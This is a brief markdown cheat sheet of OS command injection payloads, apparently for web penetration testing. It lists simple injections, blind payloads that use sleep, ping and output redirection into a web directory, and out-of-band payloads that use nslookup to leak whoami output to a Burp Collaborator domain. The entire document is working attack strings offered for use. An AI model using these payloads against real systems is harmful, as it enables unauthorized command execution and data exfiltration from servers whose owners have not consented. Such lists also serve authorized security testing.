# OS Command Injection Payloads
___
## Simple Case
```sh
& whoami #

;ls

;ls;
```
## Blind injection
```sh
& sleep 10 #

; sleep 10 ;

& whoami > /var/www/images/output.txt # >> Output redirection

; whoami > /var/www/images/output.txt ; >> Output redirection

asd||sleep 5|| >> Middle of two parameter.

||ping+-c+10+127.0.0.1||

asd||sleep 5 # >> Last parameter or to comment out extra parameter
```
## Out of band
```sh
& nslookup xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup $(whoami).xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
```
